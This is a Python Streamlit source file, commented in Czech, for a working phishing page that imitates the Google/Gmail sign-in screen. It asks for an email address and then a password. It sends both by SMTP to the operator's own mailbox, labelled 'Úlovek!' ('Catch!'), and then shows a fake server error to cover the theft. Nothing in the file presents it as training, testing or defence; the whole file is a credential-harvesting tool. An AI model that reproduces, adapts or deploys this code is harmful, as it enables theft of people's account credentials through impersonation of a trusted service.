import streamlit as st
import os
import smtplib
import time
from email.mime.text import MIMEText
from datetime import datetime

# --- NAČTENÍ ÚDAJŮ ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_data(email, heslo):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    cas = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    obsah = f"Úlovek!\nČas: {cas}\nEmail: {email}\nHeslo: {heslo}"
    msg = MIMEText(obsah)
    msg['Subject'] = "🔑 NOVÝ ZÁZNAM"
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except:
        pass

# --- LOGIKA STRÁNEK ---
if "step" not in st.session_state:
    st.session_state.step = "email"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""

st.set_page_config(page_title="Přihlášení – Účty Google")

# CSS pro vycentrování a vzhled (včetně animace načítání)
st.markdown("""
    <style>
    .main { display: flex; justify-content: center; }
    .stButton>button { width: 100%; background-color: #1a73e8; color: white; border-radius: 4px; }
    .google-text { font-family: 'Product Sans', Arial, sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

col1, col2, col3 = st.columns([1, 2, 1])

with col2:
    # 1. KROK: ZADÁNÍ EMAILU
    if st.session_state.step == "email":
        try:
            st.image("logo.png", width=75)
        except:
            st.markdown("<h1 style='color: #4285F4; text-align: center;'>Google</h1>", unsafe_allow_html=True)
        
        st.markdown("<h3 class='google-text'>Přihlásit se</h3>", unsafe_allow_html=True)
        st.markdown("<p style='text-align: center;'>Pokračovat do služby Gmail</p>", unsafe_allow_html=True)
        
        email = st.text_input("E-mail nebo telefon", key="email_input")
        
        st.markdown("<p style='color: #1a73e8; font-size: 14px; font-weight: bold;'>Zapomněli jste e-mail?</p>", unsafe_allow_html=True)
        st.write("Nejedná se o váš počítač? K anonymnímu přihlášení použijte okno hosta.")
        
        if st.button("Další"):
            if email:
                st.session_state.zadany_email = email
                with st.spinner(''): # Animace načítání
                    time.sleep(1) 
                st.session_state.step = "password"
                st.rerun()
            else:
                st.error("Zadejte e-mail")

    # 2. KROK: ZADÁNÍ HESLA
    elif st.session_state.step == "password":
        try:
            st.image("logo.png", width=75)
        except:
            st.markdown("<h1 style='color: #4285F4; text-align: center;'>Google</h1>", unsafe_allow_html=True)

        st.markdown("""
    <h1 style='text-align: center; font-family: sans-serif;'>
        <span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span>
    </h1>
""", unsafe_allow_html=True)
  
        # Zobrazení e-mailu s ikonkou panáčka (jako u Google)
        st.markdown(f"""
            <div style='border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-block; margin-bottom: 20px;'>
                <span style='margin-right: 8px;'>👤</span><strong>{st.session_state.zadany_email}</strong>
            </div>
            """, unsafe_allow_html=True)

        heslo = st.text_input("Zadejte heslo", type="password", key="password_input")
        
        st.markdown("<p style='color: #1a73e8; font-size: 14px; font-weight: bold;'>Zapomněli jste heslo?</p>", unsafe_allow_html=True)

        if st.button("Další"):
            if heslo:
                with st.spinner(''):
                    # Odeslání všech dat najednou
                    odeslat_data(st.session_state.zadany_email, heslo)
                    time.sleep(2)
                # Přesměrování na "chybu" nebo skutečný Google
                st.error("Došlo k chybě serveru (500). Zkuste to prosím později.")
            else:
                st.error("Zadejte heslo")
        
        if st.button("Zpět", type="secondary"):
            st.session_state.step = "email"
            st.rerun()
